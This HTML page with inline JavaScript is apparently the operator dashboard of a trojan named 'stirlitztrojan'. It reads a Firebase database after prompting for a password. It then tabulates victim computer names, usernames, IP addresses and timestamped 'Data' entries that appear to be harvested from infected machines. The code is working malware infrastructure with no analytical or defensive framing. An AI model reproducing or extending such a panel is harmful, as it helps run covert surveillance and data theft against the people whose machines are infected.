<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="UTF-8">
    <title>Application</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="index.css">
    <script src="firebase.js"></script>
    <script src="firebase-auth-client.js"></script>
  </head>
  <body>
    <h1>Users:</h1>
    <table id="userTable">
      <tr><th>Computer</th><th>Username</th><th>IP</th></tr>
      <tr class="line"><th colspan="3"></th></tr>
    </table>
    <h1>Data:</h1>
    <table id="dataTable">
      <tr><th>Computer</th><th>Username</th><th>Data</th><th>Time</th><th>Date</th></tr>
      <tr class="line"><th colspan="5"></th></tr>
    </table>
    <div id="err"></div>
    <p>Copyright 2016 "I"</p>
    <script>
    <!--
    var firebase = new Firebase("https://stirlitztrojan.firebaseio.com/" + prompt("Password:"));
    firebase.on("value", function(snapshot) {
      var data = snapshot.val().data;
      var color;
      
      color = "#cccccc";
      for (var key in data) {
        if (data.hasOwnProperty(key)) {
          var name = key;
          var value = data[key];
          
          var computer =  name.split("&")[0];
          var username =  name.split("&")[1];
          var ip =        ReplaceAll(name.split("&")[2], "-", ".");
          // New row:
          var tableRow = document.getElementById("userTable").insertRow(2);
          tableRow.style.backgroundColor = color;
          if(color == "#cccccc") color = "#aaaaaa";
          else color = "#cccccc";
          var tableCellComputer = tableRow.insertCell(0);
          tableCellComputer.className = "nowrapword";
          tableCellComputer.innerHTML = computer;
          var tableCellUsername = tableRow.insertCell(1);
          tableCellUsername.className = "nowrapword";
          tableCellUsername.innerHTML = username;
          var tableCellIp = tableRow.insertCell(2);
          tableCellIp.className = "nowrapword";
          tableCellIp.innerHTML = ip;
        }
      }
      
      color = "#cccccc";
      for (var key in data) {
        if (data.hasOwnProperty(key)) {
          var name = key;
          var value = data[key];
          
          var computer = name.split(",")[0].split("&")[0];
          var username = name.split(",")[0].split("&")[1];
          var data = value;
          var time = name.split(",")[1].split("&")[1];
          var date = name.split(",")[1].split("&")[0];
          // New row:
          var tableRow = document.getElementById("dataTable").insertRow(2);
          tableRow.style.backgroundColor = color;
          if(color == "#cccccc") color = "#aaaaaa";
          else color = "#cccccc";
          var tableCellComputer = tableRow.insertCell(0);
          tableCellComputer.className = "nowrapword";
          tableCellComputer.innerHTML = computer;
          var tableCellUsername = tableRow.insertCell(1);
          tableCellUsername.className = "nowrapword";
          tableCellUsername.innerHTML = username;
          var tableCellData = tableRow.insertCell(2);
          tableCellData.className = "wrapword";
          tableCellData.innerHTML = data;
          var tableCellTime = tableRow.insertCell(3);
          tableCellTime.className = "nowrapword";
          tableCellTime.innerHTML = time;
          var tableCellDate = tableRow.insertCell(4);
          tableCellDate.className = "nowrapword";
          tableCellDate.innerHTML = date;
        }
      }
    }, function (e) {
      document.getElementById("err").innerHTML = e.code;
    });
    function EscapeRegExp(str) {
      return str.replace(/([.*+?^=!:${}()|\[\]\/\\])/g, "\\$1");
    }
    function ReplaceAll(str, search, replacement){
      return str.replace(new RegExp(EscapeRegExp(search), 'g'), replacement);
    }
    -->
    </script>
  </body>
</html>
